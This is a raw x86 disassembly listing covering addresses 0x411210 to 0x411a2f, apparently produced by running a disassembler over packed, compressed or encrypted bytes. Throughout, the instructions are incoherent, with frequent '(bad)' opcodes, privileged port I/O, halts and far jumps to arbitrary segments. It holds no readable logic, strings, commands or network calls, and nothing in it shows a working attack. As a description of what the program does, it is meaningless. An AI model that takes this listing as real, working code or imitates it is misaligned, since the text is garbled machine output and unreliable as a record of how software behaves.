  411210:	xor    DWORD PTR [edi],0x33058135
  411216:	add    BYTE PTR [ecx-0x1ca8176b],ch
  41121c:	jo     0x4111f5
  41121e:	xor    DWORD PTR [ecx+esi*1],ebp
  411221:	neg    DWORD PTR [esi+ebp*1]
  411224:	jge    0x411218
  411226:	inc    ebp
  411227:	das    
  411228:	fdiv   QWORD PTR fs:[edi-0x59]
  41122c:	mov    esp,0xcd716572
  411231:	push   0xa16de065
  411236:	(bad)  
  411237:	sub    al,0x21
  411239:	pop    es
  41123a:	ror    DWORD PTR [eax+0x73f4af83],1
  411240:	jns    0x4111ed
  411242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411243:	emms   
  411245:	mov    ds:0x47f641dd,eax
  41124a:	and    cl,cl
  41124c:	push   edi
  41124d:	clc    
  41124e:	test   ebx,0xb0d620
  411254:	stos   BYTE PTR es:[edi],al
  411255:	lock out dx,al
  411257:	and    eax,0x5dd74f01
  41125c:	dec    edx
  41125d:	mov    dl,0x46
  41125f:	ss test eax,0x960c9ca9
  411265:	cmc    
  411266:	add    eax,0x15d614d0
  41126b:	push   ebp
  41126c:	push   ebp
  41126d:	and    eax,edx
  41126f:	sub    al,0x1d
  411271:	lahf   
  411272:	in     eax,0xca
  411274:	mov    ch,0x38
  411276:	pop    es
  411277:	sub    BYTE PTR [ebx+edx*8],ch
  41127a:	jnp    0x41124b
  41127c:	pop    edi
  41127d:	out    0xb1,eax
  41127f:	dec    ebp
  411280:	fnstsw WORD PTR [ebx]
  411282:	fisubr WORD PTR [ebp+0x36d31454]
  411288:	pusha  
  411289:	cdq    
  41128a:	jl     0x411237
  41128c:	mov    edi,0x6f179b5
  411291:	test   DWORD PTR [ebp-0x58],edx
  411294:	pop    ecx
  411295:	fs mov ebp,0xddfb05f8
  41129b:	push   ecx
  41129c:	out    dx,eax
  41129d:	inc    edx
  41129e:	repz and eax,0xb39f4404
  4112a4:	cmp    ch,BYTE PTR [esi-0x1b]
  4112a7:	inc    ebx
  4112a8:	or     eax,0xd333b771
  4112ad:	loop   0x411238
  4112af:	hlt    
  4112b0:	(bad)  
  4112b1:	out    dx,al
  4112b2:	mov    edx,0x9bfddd85
  4112b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112b8:	mov    esi,0xd89dc6c6
  4112bd:	pop    edi
  4112be:	jecxz  0x41125d
  4112c0:	rcl    DWORD PTR [esi+0x5d],1
  4112c3:	xchg   esp,eax
  4112c4:	rol    DWORD PTR [ecx-0x129db4d2],1
  4112ca:	js     0x411255
  4112cc:	jno    0x411302
  4112ce:	push   ecx
  4112cf:	cmc    
  4112d0:	adc    DWORD PTR [edx+0x408cb0a6],ecx
  4112d6:	in     al,0xa2
  4112d8:	inc    edi
  4112d9:	out    0xf5,al
  4112db:	leave  
  4112dc:	fistp  WORD PTR [eax]
  4112de:	bound  eax,QWORD PTR [esi]
  4112e0:	sbb    BYTE PTR [eax+0x12],dl
  4112e3:	add    DWORD PTR ds:0x577792cc,ebx
  4112e9:	out    dx,al
  4112ea:	popf   
  4112eb:	inc    esp
  4112ec:	xchg   esp,eax
  4112ed:	pop    edi
  4112ee:	in     eax,0xd1
  4112f0:	pushf  
  4112f1:	jnp    0x41136d
  4112f3:	arpl   WORD PTR [ebx],dx
  4112f5:	xor    eax,esi
  4112f7:	ins    DWORD PTR es:[edi],dx
  4112f8:	sub    eax,esp
  4112fa:	dec    eax
  4112fb:	sub    al,0x3d
  4112fd:	push   0xffffffb9
  4112ff:	and    al,0x6d
  411301:	add    cl,ah
  411303:	inc    ecx
  411304:	or     ch,ch
  411306:	jge    0x411304
  411308:	js     0x4112af
  41130a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41130b:	mov    edx,0xbd1d9ac
  411310:	or     edi,DWORD PTR [edi]
  411312:	mov    eax,ds:0xfd5c093e
  411317:	retf   0x1dc0
  41131a:	push   ebp
  41131b:	addr16 mov al,ds:0xf58b
  41131f:	cmp    DWORD PTR [eax-0x42],edi
  411322:	daa    
  411323:	mov    ch,0xf6
  411325:	aam    0xd4
  411327:	sub    BYTE PTR [edi],ch
  411329:	inc    edx
  41132a:	xchg   al,dh
  41132c:	enter  0x2f5f,0xb1
  411330:	icebp  
  411331:	sbb    al,0xeb
  411333:	add    BYTE PTR [esi-0x516685aa],0xbd
  41133a:	sbb    eax,0x28978c41
  41133f:	dec    ebx
  411340:	test   al,0x83
  411342:	js     0x411390
  411344:	pop    ebp
  411345:	pop    edx
  411346:	ja     0x4113b0
  411348:	sbb    eax,0xba88d1a0
  41134d:	nop
  41134e:	pusha  
  41134f:	dec    edi
  411350:	dec    ebx
  411351:	lahf   
  411352:	js     0x41131b
  411354:	in     al,0xa6
  411356:	jnp    0x41135c
  411358:	loop   0x4112f4
  41135a:	test   bl,bh
  41135c:	jnp    0x411331
  41135e:	jmp    0x411317
  411360:	adc    DWORD PTR [esi+0x78],0x5b
  411364:	pop    es
  411365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411366:	jo     0x4113a7
  411368:	mov    ch,BYTE PTR [ecx-0x1e]
  41136b:	in     al,dx
  41136c:	sub    DWORD PTR [edx+edx*1],0x6d340d75
  411373:	test   DWORD PTR [edx-0x77],edi
  411376:	dec    ebx
  411377:	jl     0x41133e
  411379:	dec    edi
  41137a:	fbstp  TBYTE PTR [eax-0x1d4e37d5]
  411380:	loop   0x41139d
  411382:	das    
  411383:	cdq    
  411384:	push   cs
  411385:	sti    
  411386:	outs   dx,BYTE PTR ds:[esi]
  411387:	mov    WORD PTR [esi-0x268a0fdc],gs
  41138d:	mov    al,ds:0xd413a5d
  411392:	pop    es
  411393:	aas    
  411394:	jmp    0x41139a
  411396:	aas    
  411397:	and    edi,DWORD PTR [ebx+0x4bf9e768]
  41139d:	repnz outs dx,DWORD PTR ds:[esi]
  41139f:	xor    ch,BYTE PTR [ebp+0x56]
  4113a2:	ret    0x4b40
  4113a5:	xor    ebx,esp
  4113a7:	xchg   esi,ebp
  4113a9:	test   eax,0x692ad336
  4113ae:	loopne 0x4113e6
  4113b0:	mov    ds:0xab1cc184,eax
  4113b5:	outs   dx,DWORD PTR ds:[esi]
  4113b6:	out    0xb2,al
  4113b8:	sahf   
  4113b9:	outs   dx,BYTE PTR ds:[esi]
  4113ba:	int    0x59
  4113bc:	mov    bl,0x6e
  4113be:	mov    edx,0x2a85c93b
  4113c3:	adc    BYTE PTR [ebx+0x5c12f9fe],0x54
  4113ca:	mov    dh,0x3
  4113cc:	xor    eax,0xdf782100
  4113d1:	xor    BYTE PTR [edx+edi*8],ch
  4113d4:	fild   DWORD PTR [ebp+0x3a79c387]
  4113da:	push   0xa4b660b9
  4113df:	xchg   edi,eax
  4113e0:	rcr    ebp,cl
  4113e2:	xchg   ebp,eax
  4113e3:	sbb    DWORD PTR [edx+ecx*1-0x3dfada93],edx
  4113ea:	cmp    bl,BYTE PTR [ecx+ecx*1+0x295834af]
  4113f1:	out    dx,al
  4113f2:	or     al,0x1f
  4113f4:	sar    edx,cl
  4113f6:	dec    edx
  4113f7:	pop    edi
  4113f8:	movd   DWORD PTR [ebp-0x537266be],mm1
  4113ff:	mov    WORD PTR [eax-0x18ed6b45],ds
  411405:	inc    edx
  411406:	sub    dh,0x92
  411409:	mov    bl,0xf1
  41140b:	mov    dl,0x10
  41140d:	add    al,0xc9
  41140f:	shl    eax,cl
  411411:	sbb    edx,esp
  411413:	xor    al,0x32
  411415:	sahf   
  411416:	popf   
  411417:	push   esi
  411418:	sbb    DWORD PTR [eax+eiz*1+0x5a],0x489b0c82
  411420:	pushf  
  411421:	mov    dl,0x59
  411423:	in     al,0x7f
  411425:	and    BYTE PTR [esi],bl
  411427:	xchg   edx,eax
  411428:	test   BYTE PTR [ebp-0x4c4cac85],cl
  41142e:	jecxz  0x41143a
  411430:	(bad)  
  411431:	pop    ds
  411432:	fsub   st(1),st
  411434:	jns    0x411414
  411436:	ss scas eax,DWORD PTR es:[edi]
  411438:	rcl    BYTE PTR [eax+edi*2-0x6c370f02],cl
  41143f:	and    edx,DWORD PTR [esi-0x12b762ed]
  411445:	out    0xd4,eax
  411447:	cmp    ah,BYTE PTR [edi]
  411449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41144a:	xchg   edi,eax
  41144b:	int    0x53
  41144d:	(bad)  
  41144e:	sbb    esp,eax
  411450:	add    DWORD PTR [ebx-0x748e7c91],ebx
  411456:	mov    BYTE PTR [eax+0x34d9b40],dl
  41145c:	loopne 0x41140c
  41145e:	cmp    eax,0xd36c903f
  411463:	jmp    0xa346:0x92774063
  41146a:	les    ebp,FWORD PTR [ebp-0x33]
  41146d:	hlt    
  41146e:	mov    eax,ds:0x8623d8d9
  411473:	dec    edx
  411474:	adc    eax,DWORD PTR [edx-0x45]
  411477:	out    0x1e,eax
  411479:	lods   eax,DWORD PTR ds:[esi]
  41147a:	sahf   
  41147b:	mov    gs,WORD PTR [esi]
  41147d:	leave  
  41147e:	dec    edx
  41147f:	sub    DWORD PTR [eax-0x5b5743c2],0x99b9366e
  411489:	adc    eax,0xd7ae49c7
  41148e:	retf   
  41148f:	adc    al,0xa4
  411491:	daa    
  411492:	and    BYTE PTR [edx],ah
  411494:	cld    
  411495:	das    
  411496:	nop
  411497:	cmp    ah,BYTE PTR [ecx]
  411499:	xchg   ebx,eax
  41149a:	add    cl,BYTE PTR [ebx+0x458a8b5f]
  4114a0:	mov    ecx,0x6d2522dd
  4114a5:	sub    ch,ah
  4114a7:	sbb    al,0x45
  4114a9:	out    0x21,eax
  4114ab:	inc    esp
  4114ac:	xchg   ecx,eax
  4114ad:	mov    edi,0x96076b15
  4114b2:	sub    edi,eax
  4114b4:	push   esi
  4114b5:	xor    ecx,esi
  4114b7:	pop    ebx
  4114b8:	cmc    
  4114b9:	pop    edi
  4114ba:	call   0x3724:0x3f024cdf
  4114c1:	mov    ch,0x49
  4114c3:	push   ebp
  4114c4:	in     eax,dx
  4114c5:	imul   edi,DWORD PTR [edx+0x9],0xffffffdf
  4114c9:	loopne 0x4114da
  4114cb:	rcr    al,cl
  4114cd:	ins    DWORD PTR es:[edi],dx
  4114ce:	adc    DWORD PTR [eax-0x588c204],ebx
  4114d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114d5:	loopne 0x411524
  4114d7:	add    ch,cl
  4114d9:	inc    edx
  4114da:	add    ebx,DWORD PTR [edi-0x1240b115]
  4114e0:	fbstp  TBYTE PTR [esi+ecx*2]
  4114e3:	(bad)  
  4114e4:	loop   0x411531
  4114e6:	xchg   esi,eax
  4114e7:	cwde   
  4114e8:	shr    DWORD PTR [ecx],1
  4114ea:	ror    BYTE PTR [edi+0x1f7df472],1
  4114f0:	dec    ecx
  4114f1:	pop    ds
  4114f2:	dec    edi
  4114f3:	ds jp  0x4114c0
  4114f6:	xlat   BYTE PTR ds:[ebx]
  4114f7:	mov    bl,0xb4
  4114f9:	sub    esp,ecx
  4114fb:	pop    esi
  4114fc:	xchg   DWORD PTR [ecx+0x58],ebx
  4114ff:	enter  0xdf33,0xe3
  411503:	xchg   edi,eax
  411504:	push   ebp
  411505:	jmp    0x46b3:0x230a0ec2
  41150c:	mov    dl,BYTE PTR [esi+0xc]
  41150f:	or     DWORD PTR [eax+0x6c4b0194],0x72953f65
  411519:	mov    ecx,0xc768130f
  41151e:	ins    DWORD PTR es:[edi],dx
  41151f:	mov    BYTE PTR [ecx-0x6d0e22f1],al
  411525:	lock cmc 
  411527:	enter  0xd0da,0xc4
  41152b:	and    cl,dl
  41152d:	dec    esp
  41152e:	(bad)  
  41152f:	jmp    0x150d:0x71accbd2
  411536:	pop    edx
  411537:	push   DWORD PTR [ebp+0x4955706f]
  41153d:	sti    
  41153e:	out    dx,eax
  41153f:	test   DWORD PTR [esi+0x3dc8d307],0x4e4c417f
  411549:	and    DWORD PTR [eax-0x69],edx
  41154c:	fiadd  DWORD PTR [edi-0x75536668]
  411552:	fadd   DWORD PTR [ecx]
  411554:	push   edi
  411555:	cmp    BYTE PTR [ebx+0x3ad9b6d3],dl
  41155b:	out    dx,al
  41155c:	mov    dl,0xab
  41155e:	out    0xbf,eax
  411560:	inc    ebp
  411561:	addr16 pop ebp
  411563:	dec    edx
  411564:	sub    eax,0x842ba3ee
  411569:	pop    esi
  41156a:	adc    eax,0x23ea7978
  41156f:	xor    BYTE PTR [ebp+0x52688feb],0x5d
  411576:	fistp  WORD PTR [eax-0x4f2556de]
  41157c:	push   es
  41157d:	loope  0x41159f
  41157f:	and    eax,0x4a612e82
  411584:	arpl   WORD PTR [ebp-0x46865c51],sp
  41158a:	imul   ecx,esi,0xc277a287
  411590:	add    eax,0x2233a719
  411595:	aad    0x8e
  411597:	jl     0x411552
  411599:	int3   
  41159a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41159b:	lods   al,BYTE PTR ds:[esi]
  41159c:	stos   BYTE PTR es:[edi],al
  41159d:	mov    fs,WORD PTR es:[edx]
  4115a0:	pop    ss
  4115a1:	xchg   esp,eax
  4115a2:	xchg   esi,eax
  4115a3:	push   cs
  4115a4:	jg     0x4115ae
  4115a6:	pushf  
  4115a7:	imul   esi,eax,0x7a
  4115aa:	test   al,0x97
  4115ac:	ret    
  4115ad:	add    BYTE PTR [edx-0x5f],ah
  4115b0:	push   ecx
  4115b1:	cmp    dl,BYTE PTR [esi-0x58]
  4115b4:	dec    edi
  4115b5:	xchg   esi,eax
  4115b6:	lds    esi,FWORD PTR [ecx-0x13dce638]
  4115bc:	cli    
  4115bd:	je     0x4115c0
  4115bf:	add    dl,ah
  4115c1:	add    DWORD PTR [ebp+ecx*4+0x30ed0ec2],edx
  4115c8:	popa   
  4115c9:	mov    dh,0xea
  4115cb:	loop   0x411550
  4115cd:	sub    dl,dl
  4115cf:	(bad)  
  4115d0:	repz cmp DWORD PTR [esi],esp
  4115d3:	cmp    eax,0xf7bbf951
  4115d8:	cmp    ah,dh
  4115da:	xchg   DWORD PTR [ecx],esi
  4115dc:	mov    ah,0xf8
  4115de:	sbb    ebp,DWORD PTR [edi+0x5b1ec015]
  4115e4:	lock repz add eax,0xb6e6f879
  4115eb:	loope  0x4115fe
  4115ed:	pop    eax
  4115ee:	dec    esp
  4115ef:	imul   DWORD PTR [ebx-0xc]
  4115f2:	addr16 mov ds:0x4e65,eax
  4115f6:	xor    ebp,edi
  4115f8:	mov    ah,0xec
  4115fa:	push   ss
  4115fb:	(bad)  
  4115fc:	loopne 0x411583
  4115fe:	clc    
  4115ff:	ror    DWORD PTR [esi+0x72],1
  411602:	jno    0x411629
  411604:	and    ecx,DWORD PTR [eax]
  411606:	dec    eax
  411607:	sbb    bl,BYTE PTR [edx+0x5ddd05b]
  41160d:	sbb    dl,bl
  41160f:	or     al,0xe7
  411611:	cld    
  411612:	imul   edx,DWORD PTR [ebp+0x31],0xc48d2327
  411619:	ins    BYTE PTR es:[edi],dx
  41161a:	xchg   DWORD PTR [ecx],edi
  41161c:	imul   edx,DWORD PTR [edi-0x6bcb9aff],0xcd5bcc7a
  411626:	loopne 0x41168c
  411628:	mov    ch,0xf1
  41162a:	fs cli 
  41162c:	xor    BYTE PTR [ecx-0x1cad0657],0xd2
  411633:	repz inc ecx
  411635:	cmp    bh,BYTE PTR [eax+0x16]
  411638:	mov    edx,0x7ada3cf4
  41163d:	out    0xa4,al
  41163f:	or     eax,0xdf4ffaba
  411644:	mov    ah,0x69
  411646:	and    eax,0x82545586
  41164b:	mov    edx,0xed136f30
  411650:	or     BYTE PTR ds:0x878fb211,dl
  411656:	jns    0x4115fe
  411658:	je     0x411612
  41165a:	sub    DWORD PTR [ecx-0x6f947aa8],edi
  411660:	push   ebx
  411661:	popf   
  411662:	stc    
  411663:	shl    ebx,1
  411665:	push   ds
  411666:	sbb    al,0x3b
  411668:	test   BYTE PTR [eax+edx*4-0x5e10f0a7],ah
  41166f:	pop    dx
  411671:	inc    edx
  411672:	or     DWORD PTR ds:0x6e44a95e,edx
  411678:	adc    eax,0xdea9dd48
  41167d:	mov    dl,0xe1
  41167f:	ss xchg edi,eax
  411681:	or     eax,0x3f3c4d19
  411686:	rcr    BYTE PTR [ebp+0x8],cl
  411689:	sbb    eax,0xf86f7f4f
  41168e:	jo     0x4116b6
  411690:	icebp  
  411691:	pop    ebx
  411692:	mov    ebx,esi
  411694:	dec    eax
  411695:	inc    edx
  411696:	fistp  QWORD PTR [eax+esi*8]
  411699:	jl     0x411705
  41169b:	dec    edi
  41169c:	imul   edx,edx,0x50f8ee57
  4116a2:	les    edx,FWORD PTR [ebx-0x33]
  4116a5:	dec    edx
  4116a6:	mov    esp,0xde1edb51
  4116ab:	rcl    BYTE PTR [ebp+0xd849e22],0xe1
  4116b2:	push   ebp
  4116b3:	imul   ebx,edx,0x8ed97b8a
  4116b9:	out    dx,eax
  4116ba:	dec    edi
  4116bb:	in     al,0xd8
  4116bd:	pop    es
  4116be:	inc    ebx
  4116bf:	jl     0x41168f
  4116c1:	sar    esp,1
  4116c3:	popa   
  4116c4:	(bad)  
  4116c5:	mov    al,ds:0x498fbfb1
  4116ca:	cmc    
  4116cb:	fstp   DWORD PTR [eax+0x50315fd]
  4116d1:	sub    eax,0xca902894
  4116d6:	fnstenv [eax-0x5e]
  4116d9:	mov    dh,0x59
  4116db:	outs   dx,BYTE PTR ds:[esi]
  4116dc:	dec    edi
  4116dd:	add    eax,ebx
  4116df:	int3   
  4116e0:	repnz repnz std 
  4116e3:	in     al,dx
  4116e4:	cdq    
  4116e5:	adc    al,0xf4
  4116e7:	aam    0xd2
  4116e9:	popf   
  4116ea:	push   DWORD PTR [edi+ebx*1]
  4116ed:	int3   
  4116ee:	cmp    BYTE PTR [ebx],dl
  4116f0:	das    
  4116f1:	push   0xb
  4116f3:	sbb    DWORD PTR [esi+edx*4],0xcca64237
  4116fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116fb:	add    BYTE PTR cs:[eax-0x73f0a8cd],0x96
  411703:	shl    BYTE PTR [eax+0x6805a515],1
  411709:	adc    ch,BYTE PTR [ebx+0x4e6aabe5]
  41170f:	sti    
  411710:	jl     0x411760
  411712:	jecxz  0x411793
  411714:	pop    es
  411715:	aad    0x14
  411717:	stc    
  411718:	test   al,bl
  41171a:	lds    ebp,FWORD PTR [edi+ebp*1]
  41171d:	sub    DWORD PTR [edx+0x3e],ecx
  411720:	add    esi,edi
  411722:	je     0x4116f8
  411724:	jle    0x4116b0
  411726:	bound  edx,QWORD PTR [ebp+esi*4-0x18]
  41172a:	inc    ebx
  41172b:	icebp  
  41172c:	push   0xe2b70edb
  411731:	lds    ecx,FWORD PTR [esi+0x791e1c10]
  411737:	or     ebp,edx
  411739:	jbe    0x41174e
  41173b:	gs sub eax,0xa1b4c8c6
  411741:	scas   al,BYTE PTR es:[edi]
  411742:	js     0x4116f7
  411744:	shr    DWORD PTR [eax+0x54],cl
  411747:	int    0xb0
  411749:	ror    DWORD PTR [esi+0x57b8f305],cl
  41174f:	xacquire xchg DWORD PTR [edi+0x34],ebp
  411753:	inc    edi
  411754:	mov    ss,WORD PTR [esi+edx*2-0x14abb239]
  41175b:	pop    eax
  41175c:	push   cs
  41175d:	and    BYTE PTR [ecx+ebx*8+0x62784627],dl
  411764:	les    esi,FWORD PTR [edx]
  411766:	add    BYTE PTR [ecx],ah
  411768:	test   DWORD PTR [esp+ebx*1-0x156ba4b0],ecx
  41176f:	add    dl,ch
  411771:	inc    edi
  411772:	sbb    esp,DWORD PTR [ebx]
  411774:	adc    DWORD PTR [ebp-0x7e],ebx
  411777:	mov    edi,edx
  411779:	fldl2e 
  41177b:	lods   eax,DWORD PTR ds:[esi]
  41177c:	add    BYTE PTR [ebp+0x1a],0x41
  411780:	data16 es jp 0x411796
  411784:	sub    eax,0x2748ae0a
  411789:	cld    
  41178a:	xor    al,0x4b
  41178c:	cwde   
  41178d:	mov    edx,ecx
  41178f:	call   eax
  411791:	cld    
  411792:	repnz mov ebp,0x55121794
  411798:	or     DWORD PTR [esi],0x51d6fdd6
  41179e:	loope  0x4117e8
  4117a0:	jno    0x4117bd
  4117a2:	nop
  4117a3:	add    al,0x9e
  4117a5:	push   eax
  4117a6:	jno    0x411755
  4117a8:	mov    ds:0xca2f531b,eax
  4117ad:	mov    cl,0xe5
  4117af:	mov    bl,0x79
  4117b1:	jno    0x411759
  4117b3:	daa    
  4117b4:	sahf   
  4117b5:	push   es
  4117b6:	test   esp,ebx
  4117b8:	sahf   
  4117b9:	lods   eax,DWORD PTR ds:[esi]
  4117ba:	rcl    DWORD PTR [edx+ebx*1+0x12],1
  4117be:	ret    0x6242
  4117c1:	dec    edi
  4117c2:	repnz addr16 leave 
  4117c5:	jb     0x41180c
  4117c7:	pop    ss
  4117c8:	call   0xd820:0xeb5a5bcb
  4117cf:	push   ds
  4117d0:	push   cs
  4117d1:	adc    DWORD PTR [ebx+0x2f],ebx
  4117d4:	pop    ebp
  4117d5:	nop
  4117d6:	sbb    DWORD PTR [ecx],esi
  4117d8:	int    0x2e
  4117da:	lods   eax,DWORD PTR ds:[esi]
  4117db:	cmp    al,0x8e
  4117dd:	cld    
  4117de:	xchg   edx,eax
  4117df:	and    ch,0xaa
  4117e2:	cdq    
  4117e3:	out    0x1d,eax
  4117e5:	out    dx,eax
  4117e6:	mov    ds,WORD PTR [ebx+esi*2]
  4117e9:	cmp    DWORD PTR [ebx-0x21296e5b],esp
  4117ef:	dec    ebp
  4117f0:	and    eax,0xcb2e31f4
  4117f5:	mov    ch,al
  4117f7:	fiadd  WORD PTR [edi-0x4e]
  4117fa:	add    BYTE PTR [ecx],bl
  4117fc:	(bad)  
  4117fd:	jp     0x41178f
  4117ff:	test   eax,0xc2a922fc
  411804:	fwait
  411805:	or     esi,DWORD PTR [ebp-0x72]
  411808:	cli    
  411809:	or     eax,0x6bdb1133
  41180e:	mov    ebx,0xc5957967
  411813:	jb     0x411831
  411815:	adc    eax,0xf1f02bf0
  41181a:	ss test eax,0x1e616e12
  411820:	scas   al,BYTE PTR es:[edi]
  411821:	xlat   BYTE PTR ds:[ebx]
  411822:	fwait
  411823:	out    0xf,eax
  411825:	ds (bad) 
  411827:	pop    esp
  411828:	out    0x9e,al
  41182a:	adc    ebp,ebx
  41182c:	mov    ds:0x48cb394f,eax
  411831:	push   eax
  411832:	dec    DWORD PTR ds:0x94628848
  411838:	in     eax,dx
  411839:	jb     0x411878
  41183b:	xor    eax,edx
  41183d:	adc    al,0xb9
  41183f:	dec    ecx
  411840:	cmp    DWORD PTR [edi],ebp
  411842:	add    eax,0x9acc60d
  411847:	mov    cl,0x14
  411849:	inc    eax
  41184a:	add    edi,edi
  41184c:	dec    ecx
  41184d:	sahf   
  41184e:	repnz and al,0xbe
  411851:	or     al,0x72
  411853:	push   ecx
  411854:	mov    ah,0x15
  411856:	dec    ebp
  411857:	pop    ds
  411858:	loopne 0x411842
  41185a:	shl    bh,cl
  41185c:	and    al,0x24
  41185e:	imul   ecx,edi,0x33342788
  411864:	imul   ecx,DWORD PTR [eax+0x1853cff0],0x3b
  41186b:	rcl    DWORD PTR [esi],0x27
  41186e:	push   esp
  41186f:	push   eax
  411870:	outs   dx,BYTE PTR ds:[esi]
  411871:	imul   eax,ecx,0x42c4aff1
  411877:	xchg   DWORD PTR [edi+0x55],esp
  41187a:	and    al,0x17
  41187c:	out    dx,eax
  41187d:	jge    0x411849
  41187f:	hlt    
  411880:	out    dx,eax
  411881:	cmp    DWORD PTR [ebx+0x3c873716],edi
  411887:	dec    eax
  411888:	or     al,0x5d
  41188a:	ins    DWORD PTR es:[edi],dx
  41188b:	in     al,dx
  41188c:	mov    al,0xf6
  41188e:	jp     0x4118db
  411890:	bound  esi,QWORD PTR [ebp-0x502a4a27]
  411896:	and    eax,0x9762fde
  41189b:	or     ebp,ecx
  41189d:	jne    0x411827
  41189f:	push   eax
  4118a0:	mov    bl,0x8f
  4118a2:	cmp    dl,dh
  4118a4:	in     eax,0x73
  4118a6:	aas    
  4118a7:	retf   0xfc9f
  4118aa:	pop    ebp
  4118ab:	push   0xc3ea72b0
  4118b0:	xchg   edx,eax
  4118b1:	aam    0x70
  4118b3:	sub    eax,0x523fb128
  4118b8:	ss in  eax,dx
  4118ba:	jecxz  0x4118db
  4118bc:	xchg   BYTE PTR [ecx-0x1e],al
  4118bf:	aad    0x16
  4118c1:	ss push esi
  4118c3:	or     dh,BYTE PTR [esi+esi*8+0xee38d4a]
  4118ca:	addr16 lahf 
  4118cc:	dec    edi
  4118cd:	imul   edx,DWORD PTR [ecx+0x76de8973],0x17
  4118d4:	std    
  4118d5:	mov    edi,0xd0521f3c
  4118da:	aaa    
  4118db:	inc    esi
  4118dc:	into   
  4118dd:	aad    0x5e
  4118df:	ins    BYTE PTR es:[edi],dx
  4118e0:	pop    esi
  4118e1:	and    eax,0x887d51ad
  4118e6:	add    al,0x51
  4118e8:	loop   0x4118eb
  4118ea:	cwde   
  4118eb:	test   DWORD PTR [esi+0x31b5f59a],edi
  4118f1:	arpl   cx,cx
  4118f3:	icebp  
  4118f4:	(bad)  
  4118f5:	or     eax,0x2449fc4a
  4118fa:	arpl   WORD PTR [edi],ax
  4118fc:	repnz push 0x3251730c
  411902:	rcl    BYTE PTR [ecx+0x20],1
  411905:	inc    eax
  411906:	cmp    eax,0x3a0f7209
  41190b:	fiadd  DWORD PTR [ebx+0x38]
  41190e:	lahf   
  41190f:	aad    0x66
  411911:	mov    esi,0x607789c7
  411916:	jmp    0xa4e8:0x2ff197f1
  41191d:	and    dh,BYTE PTR [edx-0x41]
  411920:	mov    ds:0xff5c14d8,al
  411925:	inc    esp
  411926:	inc    eax
  411927:	jmp    0x411972
  411929:	int    0x8
  41192b:	push   0xffffff97
  41192d:	xchg   esp,eax
  41192e:	sbb    al,0x92
  411930:	or     eax,eax
  411932:	test   DWORD PTR [eax],eax
  411934:	fiadd  WORD PTR [eax-0x7f]
  411937:	mov    bh,0x48
  411939:	or     ebx,DWORD PTR [eax]
  41193b:	xor    BYTE PTR [esi+0x650c9592],ah
  411941:	inc    edx
  411942:	imul   eax,DWORD PTR ds:0x38797bcd,0xffffff86
  411949:	xor    al,0xd5
  41194b:	pop    ecx
  41194c:	aas    
  41194d:	and    DWORD PTR [edi-0x957febb],esi
  411953:	ret    0xe1e5
  411956:	adc    BYTE PTR [edx+0x291ef24e],cl
  41195c:	outs   dx,BYTE PTR ds:[esi]
  41195d:	jnp    0x41195b
  41195f:	stc    
  411960:	xor    BYTE PTR [eax+edx*8],cl
  411963:	shl    BYTE PTR [esi-0x19dae65b],0x14
  41196a:	push   ebx
  41196b:	cs xchg esp,eax
  41196d:	xor    DWORD PTR [esi+0x74],0xffffff8f
  411971:	gs mov dl,0x8b
  411974:	shl    DWORD PTR [ecx],0x28
  411977:	out    0x54,al
  411979:	mov    BYTE PTR [esi],bh
  41197b:	into   
  41197c:	jnp    0x41191b
  41197e:	retf   
  41197f:	inc    ebx
  411980:	mov    ecx,0x83d0f8f
  411985:	or     eax,0x1a3d8c41
  41198a:	and    bh,bl
  41198c:	xchg   ebp,eax
  41198d:	and    DWORD PTR [edx+0x339e2840],ebx
  411993:	cs cmp al,0x5d
  411996:	out    0xc1,al
  411998:	xchg   edi,eax
  411999:	mov    ecx,0x5e087194
  41199e:	pop    edi
  41199f:	mov    WORD PTR [edx+esi*1],?
  4119a2:	(bad)  
  4119a4:	xor    ebp,DWORD PTR [eax-0x64]
  4119a7:	(bad)  
  4119a8:	shl    esi,1
  4119aa:	dec    eax
  4119ab:	pop    eax
  4119ac:	es pop edx
  4119ae:	jno    0x41199c
  4119b0:	inc    esp
  4119b1:	add    bl,cl
  4119b3:	mov    ds:0xdd68e0d1,eax
  4119b8:	adc    esi,ecx
  4119ba:	jnp    0x41199f
  4119bc:	pop    eax
  4119bd:	or     eax,0x5ac4cd
  4119c2:	fninit 
  4119c4:	inc    esp
  4119c5:	jg     0x41195f
  4119c7:	loopne 0x411977
  4119c9:	sbb    bh,BYTE PTR [eax]
  4119cb:	sbb    bl,BYTE PTR [ebp-0x11]
  4119ce:	test   BYTE PTR [ecx+esi*8-0x43],cl
  4119d2:	clc    
  4119d3:	idiv   ch
  4119d5:	sub    dl,BYTE PTR [ebx+0x3a]
  4119d8:	outs   dx,DWORD PTR ds:[esi]
  4119d9:	push   edx
  4119da:	das    
  4119db:	data16 daa 
  4119dd:	jnp    0x411a2e
  4119df:	aam    0x9d
  4119e1:	repnz xor esp,DWORD PTR ss:[edi-0x6]
  4119e6:	mov    ecx,0x8ca1ffc6
  4119eb:	inc    esp
  4119ec:	pop    DWORD PTR [ebp-0x1b26f9f8]
  4119f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119f3:	sub    ecx,ebx
  4119f5:	test   BYTE PTR [esi],0x8f
  4119f8:	shr    bh,0x2e
  4119fb:	jg     0x4119be
  4119fd:	sub    ecx,DWORD PTR [esi]
  4119ff:	cli    
  411a00:	mov    dh,0xfd
  411a02:	shl    BYTE PTR [eax],1
  411a04:	jge    0x4119e4
  411a06:	add    DWORD PTR [edx+0x4],ecx
  411a09:	call   0xa598:0x9736d5e3
  411a10:	loop   0x4119ff
  411a12:	pop    ds
  411a13:	adc    eax,0x36ed190c
  411a18:	push   ebx
  411a19:	(bad)  
  411a1a:	xor    DWORD PTR [eax-0x19],0x3f96b24c
  411a21:	xor    bh,BYTE PTR [edi+0x7f]
  411a24:	mov    ebx,ebx
  411a26:	mov    ds:0x1544cfd7,eax
  411a2b:	cld    
  411a2c:	push   edi
  411a2d:	ins    DWORD PTR es:[edi],dx
  411a2e:	retf   
  411a2f:	cld    
